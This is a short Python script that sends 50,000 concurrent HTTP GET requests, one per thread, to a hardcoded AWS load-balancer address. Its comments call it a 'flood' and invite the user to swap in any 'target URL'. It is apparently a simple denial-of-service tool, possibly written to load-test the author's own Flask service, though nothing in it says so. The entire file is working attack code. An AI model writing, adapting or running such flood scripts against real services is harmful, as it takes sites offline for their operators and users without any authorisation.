import requests
import threading

# Define the target URL
url = "http://flasklbwavenet-1856930680.ap-northeast-2.elb.amazonaws.com/"  # Replace with your target URL

# Function to send a single request
def send_request():
    try:
        response = requests.get(url)
        print(f"Response Code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# Function to simulate flood by sending multiple requests
def flood(target_url, num_requests):
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    # Join all threads to ensure completion
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # Number of requests to send
    number_of_requests = 50000
    
    # Start the flood
    flood(url, number_of_requests)
